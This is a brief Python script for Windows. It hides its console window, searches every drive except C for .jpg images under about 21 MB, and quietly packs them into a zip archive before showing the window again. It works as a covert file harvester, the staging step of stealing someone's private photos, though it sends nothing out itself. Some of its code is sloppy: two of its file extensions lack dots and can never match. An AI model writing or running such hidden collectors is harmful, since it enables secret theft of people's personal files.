import  os , win32gui , win32con
win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_HIDE)
from colorama import Fore , init
from zipfile import ZipFile
os.system('cls')
clear = lambda: os.system('cls' or "clear")
init()

List = ['A' , 'B' ,'D' , 'E' , 'F' ,'G' , 'H' , 'I' , 'J' , 'K' , 'L' , 'M' ,'N' , 'O' , 'P',
'Q','R','S','T','U','V','W','X','Y','Z']

zipObj = ZipFile('main.zip', 'w')

for i in List:
    EXTENSIONS = {".jpg","jpej","png" } # put type of file here
    try: 
        for dirname, dirpaths, filenames in os.walk(str(i)+":\\"):
            for filename in filenames:
                ext = os.path.splitext(filename)[-1]
                if ext in EXTENSIONS:
                    x = os.path.join(dirname, filename)
                    if os.path.getsize(x) < 21182681:
                        zipObj.write(str(x)) # Add file to zip
                        print(Fore.GREEN+"added")
    except:
        pass
print(Fore.GREEN+"program end")
win32gui.ShowWindow(win32gui.GetForegroundWindow() , win32con.SW_SHOW)